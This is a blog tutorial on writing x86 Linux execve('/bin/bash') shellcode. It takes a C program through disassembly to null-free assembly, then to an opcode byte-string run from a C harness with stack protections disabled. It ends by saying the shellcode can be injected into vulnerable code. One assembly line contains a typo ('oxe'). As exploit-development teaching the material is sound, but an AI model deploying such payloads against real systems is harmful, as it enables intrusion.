---
title: "x86 a Super quick Guide to Shellcode Writing Part 2:"
layout: post
date: 2019-03-29 12:19:00
image: /assets/images/markdown.jpg
headerImage: false
tag:
- gdb
- reversing
- debugging
- assembly
- linux
- exploit
- buffer overflow
- shellcode
star: true
category: blog
author: MaskedFox
description: Basics of Shellcode writing Part 2
---


# **Writing Shellcode Part 2**

## **Disassembling Execve and Executing Shellcode for Execve:**

**man execve**

```bash
EXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include 

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve()  executes the program pointed to by filename.  This causes the
       program that is currently being run by the calling process  to  be  re‐
       placed  with  a  new  program,  with newly initialized stack, heap, and
       (initialized and uninitialized) data segments.
```

```c
/***************
 *@Title: shell.c
 *
 *(Disassembling Execve)
 *
 * *************/
#include 
#include 

int main()
{
	char *args[2];

 	args[0] = "/bin/bash";
	args[1] = 0x0;
	execve(args[0], args, 0x0);
	
	exit(0);
}

```

Let's compile the above program and run it

1.  **compile it**
    
    ```c
    gcc -ggdb -mpreferred-stack-boundary=2 -m32 -fno-stack-protector -z execstack shell.c -o shell
    ```
    
2.  **run it**
    
    ```c
    
    root@mfox:~/Documents# ./shell
    root@mfox:/root/Documents# 
    ```
    

Voila! We got ourselves a shell

Lets look at what happen when we disas the main function of our program:

```bash
root@mfox:~/Documents# gdb -q ./shell
Reading symbols from ./shell...done.
(gdb) disas main
Dump of assembler code for function main:
   0x000011a9 <+0>:	push   ebp
   0x000011aa <+1>:	mov    ebp,esp
   0x000011ac <+3>:	push   ebx
   0x000011ad <+4>:	sub    esp,0x8
   0x000011b0 <+7>:	call   0x10b0 <__x86.get_pc_thunk.bx>
   0x000011b5 <+12>:	add    ebx,0x2e4b
   0x000011bb <+18>:	lea    eax,[ebx-0x1ff8]
   0x000011c1 <+24>:	mov    DWORD PTR [ebp-0xc],eax
   0x000011c4 <+27>:	mov    DWORD PTR [ebp-0x8],0x0
   0x000011cb <+34>:	mov    eax,DWORD PTR [ebp-0xc]
   0x000011ce <+37>:	push   0x0
   0x000011d0 <+39>:	lea    edx,[ebp-0xc]
   0x000011d3 <+42>:	push   edx
   0x000011d4 <+43>:	push   eax
   0x000011d5 <+44>:	call   0x1050 
   0x000011da <+49>:	add    esp,0xc
   0x000011dd <+52>:	push   0x0
   0x000011df <+54>:	call   0x1030 
End of assembler dump.

```

Now, lets see the above from the stack point of view: Remeber the Stack growth from High to Low memory as noted here: https://stackoverflow.com/questions/4560720/why-does-the-stack-address-grow-towards-decreasing-memory-addresses

```bash
******************    High Memory                    
*     (4 Bytes)  *
******************
*    EBP old     *
******************
*    0x0 = Null  * 
******************    EAX = p(/bin/bash)
*    p(/bin/bash)*
******************
*    0x0 = NULL  * 
******************    EDX = /bin/bash
*    EAX         *
******************
*    EDX         *
******************    Low Memory
```

Cool, Now that we understand better whats happening with our code, then we can build our Assembly:

```nasm
.data
    Bash:
        .asciz "/bin/bash"
        
    Nulll:
        .int 0;
        
    AddrToBash:
        .int 0
        
    Null2:
        .int 0
        
.text
    .globl _start
    
_start:
    # Execve routine
    
    movl $Bash, AddrToBash
    movl $11, %eax
    movl $Bash, %ebx
    movl $AddrToBash, %ecx
    movl $Null2, %edx
    int $0x80
    
    # Exit Routine
    
    Exit:
    movl $10, %ebx
    movl $1, %eax
    int $0x80 
```

Ok, lets review the above ^:

```
$11 is the syscall to execve
$Bash is the pointer to "/bin/bash"
$AddrToBash is the pointer to variable of Arguments
$Null is just a Null or 0x0
```

Cool, now lets assemble the program above:

```bash
root@mfox:~/Documents# as -ggstabs -o exec.o  exec.s
```

Now let's link it and Lets run it:

```bash
root@mfox:~/Documents# ld -o exec exec.o
root@mfox:~/Documents# ./exec 
root@mfox:/root/Documents# 

```

Cool it works!, lets see the opcodes for the above program:

```bash
root@mfox:~/Documents# objdump -d exec

exec:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	c7 05 0e a0 04 08 00 	movl   $0x804a000,0x804a00e
 8049007:	a0 04 08 
 804900a:	b8 0b 00 00 00       	mov    $0xb,%eax
 804900f:	bb 00 a0 04 08       	mov    $0x804a000,%ebx
 8049014:	b9 0e a0 04 08       	mov    $0x804a00e,%ecx
 8049019:	ba 12 a0 04 08       	mov    $0x804a012,%edx
 804901e:	cd 80                	int    $0x80

08049020 :
 8049020:	bb 0a 00 00 00       	mov    $0xa,%ebx
 8049025:	b8 01 00 00 00       	mov    $0x1,%eax
 804902a:	cd 80                	int    $0x80

```

There are too many Zeros ('0') in our opcode. So it not possible to pushe the above as shellcode.

```nasm
The Shellcode contains Nulls = '0' in it, thus
cannot be inserted into a character array
-Replace all Null Statements

Uses hardcoded addresses and thus will not work on all machines
-Setup relative addressing
```

So, lets improve our assembly code:

```nasm
#execVeShell.s

.text
.globl _start

_start:

    jmp myCallStatement
    shellcode:
        popl %esi                #pop register ESI which is the start of "bin/bashAAAAABBBBCCCCC"
        xorl %eax, %eax          # Move Zeros to EAX
        movb %al, 0x9(%esi)      # Move a Zero or NUll to "A"
        movl %esi, 0xa(%esi)      # Moves Address of ESI to "BBBB", now "MNOP"
        movl %eax, oxe(%esi)     # Moves Zeros to "CCCC" Now, "0000"
        movb $11, %al            # Moves 11 into AL(Which is the Call sys Execve)
        movl %esi, %ebx          # Moves "/bin/bash\0" into EBX
        leal 0xa(%esi), %ecx     # Moves "MNOP" into ECX
        leal 0xe(%esi), %edx     # Moves "0000" into EDX
        int $0x80
    
    myCallStatement:
        call shellcode
        shellVariables:
            .ascii "/bin/bashABBBBCCCC"
                

```

Lets link and compile this:

```
as -o execVeShellcode.o ExecVeShellcode.s

ld -o execVeShellcode execVeShellcode.o
```

Now lets check if there are any opcodes:

```bash
root@mfox:~/Documents# objdump -d execVeShellcode

execVeShellcode:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	eb 18                	jmp    804901a 

08049002 :
 8049002:	5e                   	pop    %esi
 8049003:	31 c0                	xor    %eax,%eax
 8049005:	88 46 09             	mov    %al,0x9(%esi)
 8049008:	89 76 0a             	mov    %esi,0xa(%esi)
 804900b:	89 46 0e             	mov    %eax,0xe(%esi)
 804900e:	b0 0b                	mov    $0xb,%al
 8049010:	89 f3                	mov    %esi,%ebx
 8049012:	8d 4e 0a             	lea    0xa(%esi),%ecx
 8049015:	8d 56 0e             	lea    0xe(%esi),%edx
 8049018:	cd 80                	int    $0x80

0804901a :
 804901a:	e8 e3 ff ff ff       	call   8049002 

0804901f :
 804901f:	2f                   	das    
 8049020:	62 69 6e             	bound  %ebp,0x6e(%ecx)
 8049023:	2f                   	das    
 8049024:	62 61 73             	bound  %esp,0x73(%ecx)
 8049027:	68 41 42 42 42       	push   $0x42424241
 804902c:	42                   	inc    %edx
 804902d:	43                   	inc    %ebx
 804902e:	43                   	inc    %ebx
 804902f:	43                   	inc    %ebx
 8049030:	43                   	inc    %ebx


```

Lets grab the opcodes from above and compile our shellcode:

```c
#include 
  
char shellcode[]= "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a"
                  "\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e"
                  "\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62"
                  "\x61\x73\x68\x41\x42";

int main()
{
        int *ret;
        ret = (int *)&ret +2;
        (*ret) = (int)shellcode;
}

```

Lets compile it and run it:

```bash
root@mfox:~/Documents# gcc -ggdb -mpreferred-stack-boundary=2 -m32 -fno-stack-protector -z execstack  shellExecVe.c -o shellExecVe
root@mfox:~/Documents# chmod +x shellExecVe
root@mfox:~/Documents# ./shellExecVe
root@mfox:/root/Documents# 

```

Woot Woot! Annnnnd now we know how to create our own Shellcode that you can inject in vulnerable code.

**#Important Resources:**

These serious of blogs come from the amazing tutotials from Security Tube: 
https://youtu.be/e2jQgOVkJPM
https://youtu.be/6XTmLamRonE

And also i would recommend the book: Hacking the Art of Exploitation, Shellcode Chapter, explains really well whats happening and why. I ll Suggest to do the videos and read the book
